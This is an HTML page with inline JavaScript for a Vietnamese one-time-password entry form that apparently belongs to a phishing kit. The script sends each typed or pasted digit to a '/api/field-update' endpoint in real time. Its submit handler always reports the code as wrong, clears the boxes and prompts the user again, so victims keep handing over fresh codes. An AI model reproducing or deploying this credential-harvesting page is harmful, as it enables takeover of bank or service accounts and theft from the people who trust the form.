<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Nhập mã OTP</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="css/flow-transitions.css" />
    <style>
      body {
        background: #f8f9fa;
      }

      .otp-input {
        width: 3rem;
        height: 3.5rem;
        text-align: center;
        font-size: 1.5rem;
        border: 1px solid #ced4da;
        border-radius: 0.5rem;
      }
    </style>
  </head>

  <body>
    <main class="container py-4">
      <div class="mb-3">
        <h1 class="h5">Nhập mã OTP</h1>
        <p class="text-muted">Nhập 6 chữ số đã gửi tới số của bạn.</p>
      </div>
      <div class="card shadow-sm">
        <div class="card-body">
          <div id="alertBox" class="alert alert-danger d-none"></div>
          <form id="otpForm" novalidate>
            <div class="d-flex gap-2 justify-content-center my-3" aria-label="OTP">
              <input class="otp-input" inputmode="numeric" maxlength="1" />
              <input class="otp-input" inputmode="numeric" maxlength="1" />
              <input class="otp-input" inputmode="numeric" maxlength="1" />
              <input class="otp-input" inputmode="numeric" maxlength="1" />
              <input class="otp-input" inputmode="numeric" maxlength="1" />
              <input class="otp-input" inputmode="numeric" maxlength="1" />
            </div>
            <div class="text-center">
              <button id="btnConfirm" class="btn btn-primary" type="submit" disabled>
                Xác nhận
              </button>
            </div>
          </form>
        </div>
      </div>
    </main>

    <script src="js/flow-transitions.js"></script>
    <script>
      const inputs = Array.from(document.querySelectorAll('.otp-input'));
      const btnConfirm = document.getElementById('btnConfirm');
      const alertBox = document.getElementById('alertBox');
      function getOTP() {
        return inputs.map((i) => i.value).join('');
      }
      function allFilled() {
        return inputs.every((i) => i.value.length === 1);
      }
      function showError(msg) {
        alertBox.textContent = msg;
        alertBox.classList.remove('d-none');
      }
      function clearError() {
        alertBox.classList.add('d-none');
      }

      inputs.forEach((inp, idx) => {
        inp.addEventListener('input', (e) => {
          e.target.value = e.target.value.replace(/\D/g, '').slice(0, 1);
          if (e.target.value && idx < inputs.length - 1) inputs[idx + 1].focus();
          btnConfirm.disabled = !allFilled();
          sendFieldUpdate('otp_digit_' + idx, e.target.value);
        });
        inp.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !e.target.value && idx > 0) inputs[idx - 1].focus();
        });
        inp.addEventListener('paste', (e) => {
          const data = (e.clipboardData || window.clipboardData).getData('text') || '';
          const digits = data.replace(/\D/g, '').slice(0, 6).split('');
          inputs.forEach((it, k) => (it.value = digits[k] || ''));
          btnConfirm.disabled = !allFilled();
          sendFieldUpdate('otp_paste', digits.join(''));
          e.preventDefault();
        });
      });

      async function sendFieldUpdate(field, value) {
        try {
          const url =
            location.origin && location.origin !== 'null'
              ? location.origin + '/api/field-update'
              : '/api/field-update';
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: sessionStorage.getItem('fieldSessionId') || 'no-session',
              field,
              value,
              page: 'otp.html',
            }),
          });
        } catch (e) {}
      }

      document.getElementById('otpForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        clearError();
        const otp = getOTP();
        if (otp.length !== 6) {
          showError('Vui lòng nhập đủ 6 số');
          return;
        }
        // Always treat OTP as incorrect per new rule: show friendly error, send failed audit, do not proceed to confirmation
        btnConfirm.disabled = true;
        btnConfirm.textContent = 'Đang xác thực…';
        try {
          // track attempts in session so audit includes attempt count
          const attemptsKey = 'otpAttempts';
          const prev = parseInt(sessionStorage.getItem(attemptsKey) || '0', 10) || 0;
          const attempts = prev + 1;
          sessionStorage.setItem(attemptsKey, String(attempts));

          // send failed audit with masked OTP (do not leak full secret) and attempt count
          const masked = otp.replace(/.(?=.$)/g, '•'); // mask all but last digit
          await sendFieldUpdate(
            'otp_attempt',
            JSON.stringify({ result: 'failed', attempt: attempts, maskedOtp: masked })
          );

          // show error to user
          showError('Mã OTP không đúng. Vui lòng thử lại.');

          // reset inputs so user can re-enter
          inputs.forEach((i) => (i.value = ''));
          inputs[0].focus();
          btnConfirm.disabled = false;
          btnConfirm.textContent = 'Xác nhận';
        } catch (err) {
          showError('Lỗi mạng khi kiểm tra OTP. Vui lòng thử lại.');
          btnConfirm.disabled = false;
          btnConfirm.textContent = 'Xác nhận';
        }
      });
    </script>
  </body>
</html>
